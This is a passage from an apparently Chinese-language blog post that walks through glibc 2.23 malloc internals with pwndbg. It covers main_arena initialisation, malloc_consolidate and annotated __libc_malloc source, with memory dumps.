operator">></span>                          mov    rax<span class="token punctuation">,</span> qword ptr <span class="token punctuation">[</span>rip <span class="token operator">+</span> <span class="token number">0x322993</span><span class="token punctuation">]</span>   <span class="token number">0x7ffff7aae55d</span> <span class="token operator">&lt;</span>malloc<span class="token operator">+</span><span class="token number">13</span><span class="token operator">></span>                         mov    rax<span class="token punctuation">,</span> qword ptr <span class="token punctuation">[</span>rax<span class="token punctuation">]</span>   <span class="token number">0x7ffff7aae560</span> <span class="token operator">&lt;</span>malloc<span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span>                         test   rax<span class="token punctuation">,</span> rax──────────────────────────────────────────────────────────────<span class="token punctuation">[</span> <span class="token function">SOURCE</span> <span class="token punctuation">(</span>CODE<span class="token punctuation">)</span> <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────In file<span class="token punctuation">:</span> <span class="token operator">/</span>glibc<span class="token operator">/</span>source<span class="token operator">/</span>glibc<span class="token number">-2.23</span><span class="token operator">/</span>malloc<span class="token operator">/</span>malloc<span class="token punctuation">.</span>c   <span class="token number">2898</span>    <span class="token number">2899</span> <span class="token comment" spellcheck="true">/*------------------------ Public wrappers. --------------------------------*/</span>   <span class="token number">2900</span>    <span class="token number">2901</span> <span class="token keyword">void</span> <span class="token operator">*</span>   <span class="token number">2902</span> <span class="token function">__libc_malloc</span> <span class="token punctuation">(</span>size_t bytes<span class="token punctuation">)</span> ► <span class="token number">2903</span> <span class="token punctuation">{</span>   <span class="token number">2904</span>   mstate ar_ptr<span class="token punctuation">;</span>   <span class="token number">2905</span>   <span class="token keyword">void</span> <span class="token operator">*</span>victim<span class="token punctuation">;</span>   <span class="token number">2906</span>    <span class="token number">2907</span>   <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span>hook<span class="token punctuation">)</span> <span class="token punctuation">(</span>size_t<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>   <span class="token number">2908</span>     <span class="token operator">=</span> <span class="token function">atomic_forced_read</span> <span class="token punctuation">(</span>__malloc_hook<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这个时候main_arena应该都是0：</p><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> x<span class="token operator">/</span>32gx <span class="token operator">&amp;</span>main_arena <span class="token number">0x7ffff7dd1b20</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b30</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b40</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">32</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b50</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">48</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b60</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">64</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b70</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">80</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b80</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">96</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b90</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">112</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1ba0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">128</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1bb0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">144</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1bc0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">160</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1bd0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">176</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1be0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">192</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1bf0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">208</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1c00</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">224</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1c10</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">240</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span>pwndbg<span class="token operator">></span> </code></pre><p>继续在将会执行malloc_consolidate：</p><pre class=" language-c"><code class="language-c">──────────────────────────────────────────────────────────────<span class="token punctuation">[</span> <span class="token function">SOURCE</span> <span class="token punctuation">(</span>CODE<span class="token punctuation">)</span> <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────In file<span class="token punctuation">:</span> <span class="token operator">/</span>glibc<span class="token operator">/</span>source<span class="token operator">/</span>glibc<span class="token number">-2.23</span><span class="token operator">/</span>malloc<span class="token operator">/</span>malloc<span class="token punctuation">.</span>c   <span class="token number">3446</span>    <span class="token number">3447</span>   <span class="token keyword">else</span>   <span class="token number">3448</span>     <span class="token punctuation">{</span>   <span class="token number">3449</span>       idx <span class="token operator">=</span> <span class="token function">largebin_index</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">3450</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">have_fastchunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">)</span> ► <span class="token number">3451</span>         <span class="token function">malloc_consolidate</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">3452</span>     <span class="token punctuation">}</span>   <span class="token number">3453</span>    <span class="token number">3454</span>   <span class="token operator">/</span><span class="token operator">*</span>   <span class="token number">3455</span>      Process recently freed or remaindered chunks<span class="token punctuation">,</span> taking one only <span class="token keyword">if</span>   <span class="token number">3456</span>      it is exact fit<span class="token punctuation">,</span> or<span class="token punctuation">,</span> <span class="token keyword">if</span> this a small request<span class="token punctuation">,</span> the chunk is remainder from</code></pre><p>最后会到：</p><pre class=" language-c"><code class="language-c">──────────────────────────────────────────────────────────────<span class="token punctuation">[</span> <span class="token function">SOURCE</span> <span class="token punctuation">(</span>CODE<span class="token punctuation">)</span> <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────In file<span class="token punctuation">:</span> <span class="token operator">/</span>glibc<span class="token operator">/</span>source<span class="token operator">/</span>glibc<span class="token number">-2.23</span><span class="token operator">/</span>malloc<span class="token operator">/</span>malloc<span class="token punctuation">.</span>c   <span class="token number">4210</span>    <span class="token number">4211</span>       <span class="token punctuation">}</span>   <span class="token number">4212</span>     <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>fb<span class="token operator">++</span> <span class="token operator">!=</span> maxfb<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">4213</span>   <span class="token punctuation">}</span>   <span class="token number">4214</span>   <span class="token keyword">else</span> <span class="token punctuation">{</span> ► <span class="token number">4215</span>     <span class="token function">malloc_init_state</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">4216</span>     <span class="token function">check_malloc_state</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">4217</span>   <span class="token punctuation">}</span>   <span class="token number">4218</span> <span class="token punctuation">}</span>   <span class="token number">4219</span>    <span class="token number">4220</span>    pwndbg<span class="token operator">></span> x<span class="token operator">/</span>32gx <span class="token operator">&amp;</span>main_arena <span class="token number">0x7ffff7dd1b20</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">></span><span class="token punctuation">:</span>    <span class="token number">0x0000000000000001</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b30</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span><span class="token punctuation">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b40</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">32</span><span class="token operator">></span><span class="token punctuation">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b50</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">48</span><span class="token operator">></span><span class="token punctuation">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b60</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">64</span><span class="token operator">></span><span class="token punctuation">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b70</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">80</span><span class="token operator">></span><span class="token punctuation">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b80</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">96</span><span class="token operator">></span><span class="token punctuation">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b90</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">112</span><span class="token operator">></span><span class="token punctuation">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1ba0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">128</span><span class="token operator">></span><span class="token punctuation">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1bb0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">144</span><span class="token operator">></span><span class="token punctuation">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1bc0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">160</span><span class="token operator">></span><span class="token punctuation">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1bd0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">176</span><span class="token operator">></span><span class="token punctuation">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span></code></pre><p>执行完malloc_consolidate 后就会将bins初始化为指向自己地址-0x10，并且可以看到malloc_init_state中这样的定义：mbinptr bin;说明这里在对bins进行复制操作时把他们看作了chunk，利用其fd，和bk成员。所以其实这些bins就可以看作是一个chunk，不完整的chunk有效部分只有fd，和bk段作为双向链表的表头。当malloc_init_state执行完后：</p><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> x<span class="token operator">/</span>32gx <span class="token operator">&amp;</span>main_arena <span class="token number">0x7ffff7dd1b20</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000001</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b30</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b40</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">32</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b50</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">48</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b60</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">64</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b70</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">80</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x7ffff7dd1b80</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">96</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x00007ffff7dd1b78</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>注意他们的值与自己地址的关系<span class="token number">0x7ffff7dd1b90</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">112</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd1b78</span>    <span class="token number">0x00007ffff7dd1b88</span><span class="token number">0x7ffff7dd1ba0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">128</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd1b88</span>    <span class="token number">0x00007ffff7dd1b98</span><span class="token number">0x7ffff7dd1bb0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">144</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd1b98</span>    <span class="token number">0x00007ffff7dd1ba8</span><span class="token number">0x7ffff7dd1bc0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">160</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd1ba8</span>    <span class="token number">0x00007ffff7dd1bb8</span><span class="token number">0x7ffff7dd1bd0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">176</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd1bb8</span>    <span class="token number">0x00007ffff7dd1bc8</span><span class="token number">0x7ffff7dd1be0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">192</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd1bc8</span>    <span class="token number">0x00007ffff7dd1bd8</span><span class="token number">0x7ffff7dd1bf0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">208</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd1bd8</span>    <span class="token number">0x00007ffff7dd1be8</span><span class="token number">0x7ffff7dd1c00</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">224</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd1be8</span>    <span class="token number">0x00007ffff7dd1bf8</span><span class="token number">0x7ffff7dd1c10</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">240</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd1bf8</span>    <span class="token number">0x00007ffff7dd1c08</span>pwndbg<span class="token operator">></span> </code></pre><h2 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h2><p>该函数主要有两个功能</p><ul><li><p>若 fastbin 未初始化，即 global_max_fast 为 0，那就初始化 malloc_state。</p></li><li><p>如果已经初始化的话，就合并 fastbin 中的 chunk。</p><pre class=" language-c"><code class="language-c">  <span class="token comment" spellcheck="true">/*    If max_fast is 0, we know that av hasn't    yet been initialized, in which case do so below  */</span>  <span class="token comment" spellcheck="true">// 说明 fastbin 已经初始化</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">get_max_fast</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// 清空 fastbin 标记</span>      <span class="token comment" spellcheck="true">// 因为要合并 fastbin 中的 chunk 了。</span>      <span class="token function">clear_fastchunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//</span>      unsorted_bin <span class="token operator">=</span> <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">/*        Remove each chunk from fast bin and consolidate it, placing it        then in unsorted bin. Among other reasons for doing this,        placing in unsorted bin avoids needing to calculate actual bins        until malloc is sure that chunks aren't immediately going to be        reused anyway.      */</span>      <span class="token comment" spellcheck="true">// 按照 fd 顺序遍历 fastbin 的每一个 bin，将 bin 中的每一个 chunk 合并掉。</span>      maxfb <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token function">fastbin</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> NFASTBINS <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      fb    <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token function">fastbin</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">do</span> <span class="token punctuation">{</span>          p <span class="token operator">=</span> <span class="token function">atomic_exchange_acq</span><span class="token punctuation">(</span>fb<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token keyword">do</span> <span class="token punctuation">{</span>                  <span class="token function">check_inuse_chunk</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>                  nextp <span class="token operator">=</span> p<span class="token operator">-></span>fd<span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">/* Slightly streamlined version of consolidation code in                   * free() */</span>                  size      <span class="token operator">=</span> <span class="token function">chunksize</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>                  nextchunk <span class="token operator">=</span> <span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>                  nextsize  <span class="token operator">=</span> <span class="token function">chunksize</span><span class="token punctuation">(</span>nextchunk<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">prev_inuse</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                      prevsize <span class="token operator">=</span> <span class="token function">prev_size</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>                      size <span class="token operator">+</span><span class="token operator">=</span> prevsize<span class="token punctuation">;</span>                      p <span class="token operator">=</span> <span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> prevsize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token function">unlink</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> p<span class="token punctuation">,</span> bck<span class="token punctuation">,</span> fwd<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">}</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span>nextchunk <span class="token operator">!=</span> av<span class="token operator">-></span>top<span class="token punctuation">)</span> <span class="token punctuation">{</span>                      <span class="token comment" spellcheck="true">// 判断 nextchunk 是否是空闲的。</span>                      nextinuse <span class="token operator">=</span> <span class="token function">inuse_bit_at_offset</span><span class="token punctuation">(</span>nextchunk<span class="token punctuation">,</span> nextsize<span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>nextinuse<span class="token punctuation">)</span> <span class="token punctuation">{</span>                          size <span class="token operator">+</span><span class="token operator">=</span> nextsize<span class="token punctuation">;</span>                          <span class="token function">unlink</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> nextchunk<span class="token punctuation">,</span> bck<span class="token punctuation">,</span> fwd<span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token punctuation">}</span> <span class="token keyword">else</span>                       <span class="token comment" spellcheck="true">// 设置 nextchunk 的 prev inuse 为0，以表明可以合并当前 fast chunk。</span>                          <span class="token function">clear_inuse_bit_at_offset</span><span class="token punctuation">(</span>nextchunk<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      first_unsorted     <span class="token operator">=</span> unsorted_bin<span class="token operator">-></span>fd<span class="token punctuation">;</span>                      unsorted_bin<span class="token operator">-></span>fd   <span class="token operator">=</span> p<span class="token punctuation">;</span>                      first_unsorted<span class="token operator">-></span>bk <span class="token operator">=</span> p<span class="token punctuation">;</span>                      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                          p<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>                          p<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>                      <span class="token punctuation">}</span>                      <span class="token function">set_head</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> size <span class="token operator">|</span> PREV_INUSE<span class="token punctuation">)</span><span class="token punctuation">;</span>                      p<span class="token operator">-></span>bk <span class="token operator">=</span> unsorted_bin<span class="token punctuation">;</span>                      p<span class="token operator">-></span>fd <span class="token operator">=</span> first_unsorted<span class="token punctuation">;</span>                      <span class="token function">set_foot</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">}</span>                  <span class="token keyword">else</span> <span class="token punctuation">{</span>                      size <span class="token operator">+</span><span class="token operator">=</span> nextsize<span class="token punctuation">;</span>                      <span class="token function">set_head</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> size <span class="token operator">|</span> PREV_INUSE<span class="token punctuation">)</span><span class="token punctuation">;</span>                      av<span class="token operator">-></span>top <span class="token operator">=</span> p<span class="token punctuation">;</span>                  <span class="token punctuation">}</span>              <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>p <span class="token operator">=</span> nextp<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>      <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>fb<span class="token operator">++</span> <span class="token operator">!=</span> maxfb<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul><h2 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h2><blockquote><p>一般我们会使用 malloc 函数来申请内存块，可是当仔细看 glibc 的源码实现时，其实并没有 malloc 函数。其实该函数真正调用的是 <strong>libc_malloc 函数。为什么不直接写个 malloc 函数呢，因为有时候我们可能需要不同的名称。此外，</strong>libc_malloc 函数只是用来简单封装 _int_malloc 函数。_int_malloc 才是申请内存块的核心，注意：用户申请的字节一旦进入申请内存函数中就变成了无符号整数。</p></blockquote><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">__libc_malloc</span> <span class="token punctuation">(</span>size_t bytes<span class="token punctuation">)</span><span class="token punctuation">{</span>  mstate ar_ptr<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>victim<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span>hook<span class="token punctuation">)</span> <span class="token punctuation">(</span>size_t<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>    <span class="token operator">=</span> <span class="token function">atomic_forced_read</span> <span class="token punctuation">(</span>__malloc_hook<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//检查钩子函数</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>hook <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">*</span>hook<span class="token punctuation">)</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> <span class="token function">RETURN_ADDRESS</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//如果hook != Null则执行hook中的函数</span>  <span class="token function">arena_get</span> <span class="token punctuation">(</span>ar_ptr<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//寻找对应arena</span>  victim <span class="token operator">=</span> <span class="token function">_int_malloc</span> <span class="token punctuation">(</span>ar_ptr<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//_int_malloc 函数去申请对应的内存</span>  <span class="token comment" spellcheck="true">/* Retry with another arena only if we were able to find a usable arena     before.  */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>victim <span class="token operator">&amp;&amp;</span> ar_ptr <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//如果分配失败的话，ptmalloc 会尝试再去寻找一个可用的 arena，并分配内存</span>    <span class="token punctuation">{</span>      <span class="token function">LIBC_PROBE</span> <span class="token punctuation">(</span>memory_malloc_retry<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>      ar_ptr <span class="token operator">=</span> <span class="token function">arena_get_retry</span> <span class="token punctuation">(</span>ar_ptr<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>      victim <span class="token operator">=</span> <span class="token function">_int_malloc</span> <span class="token punctuation">(</span>ar_ptr<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>ar_ptr <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token function">mutex_unlock</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>ar_ptr<span class="token operator">-></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token operator">!</span>victim <span class="token operator">||</span> <span class="token function">chunk_is_mmapped</span> <span class="token punctuation">(</span><span class="token function">mem2chunk</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span>          ar_ptr <span class="token operator">==</span> <span class="token function">arena_for_chunk</span> <span class="token punctuation">(</span><span class="token function">mem2chunk</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> victim<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//返回内存</span><span class="token punctuation">}</span><span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>__libc_malloc<span class="token punctuation">)</span></code></pre><h2 id="int-malloc"><a 